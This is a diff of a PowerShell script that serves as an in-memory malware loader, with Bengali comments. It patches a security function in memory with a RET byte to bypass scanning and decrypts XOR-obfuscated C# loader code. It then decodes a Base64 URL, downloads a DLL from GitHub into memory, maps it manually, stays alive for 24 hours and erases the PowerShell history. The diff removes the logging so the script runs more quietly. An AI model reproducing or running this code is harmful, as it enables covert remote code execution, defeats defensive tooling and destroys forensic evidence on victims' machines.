@@ -40,7 +40,7 @@ function Invoke-Bypass {
         $v = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress kernel32.dll VirtualProtect), [type])
         $old = 0
         $v.Invoke($t, 0x1000, 0x40, [ref]$old)
-        [System.Runtime.InteropServices.Marshal]::WriteByte($t, 0xC3)   # RET
+        [System.Runtime.InteropServices.Marshal]::WriteByte($t, 0xC3)
         $v.Invoke($t, 0x1000, $old, [ref]$null)
     } catch {}
 }
@@ -55,7 +55,6 @@ function Xor-Decrypt {
         for ($i=0; $i -lt $bytes.Length; $i++) { $bytes[$i] = $bytes[$i] -bxor $Key }
         return [System.Text.Encoding]::UTF8.GetString($bytes)
     } catch {
-        Write-Host "[!] Decryption error: $_" -ForegroundColor Red
         return $null
     }
 }
@@ -69,58 +68,39 @@ $encryptedCSharp = "LykzND16CSMpLj83YVAvKTM0PXoJIykuPzd0CC80LjM3P3QTNC4/KDUqCT8o
 #  ★★★ ৪. মূল স্ক্রিপ্ট – BYPASS + DECRYPT + DOWNLOAD + MAP ★★★
 # ================================================================
 
-# ৪.১ – BYPASS কল করো
 Invoke-Bypass
 
-# ৪.২ – এনক্রিপ্টেড C# ডিক্রিপ্ট করো
 $plainCSharp = Xor-Decrypt $encryptedCSharp
 
-# ৪.৩ – C# কোড কম্পাইল করো
 try {
     Add-Type -TypeDefinition $plainCSharp -ErrorAction Stop
 } catch {
-    Write-Host "[!] C# compilation failed: $_" -ForegroundColor Red
     return
 }
 
-# ৪.৪ – URL টি Base64 এনকোডেড
 $encodedUrl = "aHR0cHM6Ly9naXRodWIuY29tL2Rlc2VydDAwNy9iaW9zL3Jhdy9yZWZzL2hlYWRzL21haW4vdmVyc2lvbi5kbGw="
 $url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedUrl))
 
-# ৪.৫ – DLL ডাউনলোড করো (মেমোরিতে)
 try {
     $bytes = (New-Object System.Net.WebClient).DownloadData($url)
 } catch {
-    Write-Host "[!] Download failed: $_" -ForegroundColor Red
     return
 }
 
-# ৪.৬ – ম্যানুয়াল ম্যাপ করো
 try {
     $result = [NativeLoader]::Map($bytes, $true)
-    Write-Host "[+] DLL mapped at 0x$($result.ImageBase.ToString('X'))" -ForegroundColor Green
 } catch {
-    Write-Host "[!] Mapping failed: $_" -ForegroundColor Red
     return
 }
 
-# ৪.৭ – ক্লিনআপ (শুধু মেমোরি, প্রক্রিয়া নয়)
 $bytes = $null
 $plainCSharp = $null
 [GC]::Collect(); [GC]::WaitForPendingFinalizers()
 
-Write-Host "[+] DLL successfully loaded. Keeping PowerShell alive for 24 hours." -ForegroundColor Cyan
+Start-Sleep -Seconds 86400
 
-# ================================================================
-#  ★★★ ৫. ২৪ ঘন্টা চালু রাখার জন্য সোজা স্লিপ ★★★
-# ================================================================
-Start-Sleep -Seconds 86400   # 24 hours
-
-# ক্লিনআপ (ঐচ্ছিক) – লুপের পর একবার হালকা ক্লিন
 Clear-History
 $historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSreadline\ConsoleHost_history.txt')
 if (Test-Path $historyPath) {
     Remove-Item $historyPath -Force -ErrorAction SilentlyContinue
 }
-
-Write-Host "[+] 24 hours completed. Script ending." -ForegroundColor Yellow
